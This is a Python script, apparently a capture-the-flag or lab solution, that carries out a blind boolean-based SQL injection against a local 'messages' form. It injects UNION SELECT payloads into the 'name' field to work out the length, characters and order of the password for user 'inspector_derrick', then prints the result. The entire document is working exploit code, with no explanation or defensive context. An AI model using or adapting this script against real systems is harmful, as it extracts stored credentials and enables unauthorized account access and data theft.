from bs4 import BeautifulSoup
import json
import requests

url = "http://127.0.0.1/messages"
headers = headers = {'Content-Type': "application/x-www-form-urlencoded"}

def analyze_response(response):
    soup = BeautifulSoup(response.content, 'html.parser')
    if '200' in str(response):
        if "The name exists !" in str(soup.body):
            return 0
        else:
            return 1
    else:
        print(soup.prettify())
        return 2

# get password length
for length in range(100):
    payload = "name=0' union all select password, password from users where CHAR_LENGTH(password)={} and name='inspector_derrick".format(length)
    response = requests.post(url, data=payload, headers=headers)
    result = analyze_response(response)
    if not result:
        break

import string

# Generate set of some characters
chars = string.digits + string.ascii_lowercase + string.ascii_uppercase

# get password characters
pwd_chars = []

for c in chars:
    payload = "name=0' union all select password, password from users where password like '%{}%' and name='inspector_derrick".format(c)
    response = requests.post(url, data=payload, headers=headers)
    result = analyze_response(response)
    if not result:
        pwd_chars.append(c)

# get password characters in order
ordered_char = []
for i in range(length):
    for c in pwd_chars:
        payload = "name=0' union all select password, password from users where password like '{}{}%' and name='inspector_derrick".format(''.join(ordered_char), c)
        response = requests.post(url, data=payload, headers=headers)
        result = analyze_response(response)
        if not result:
            ordered_char.append(c)

# print password
print(''.join(ordered_char))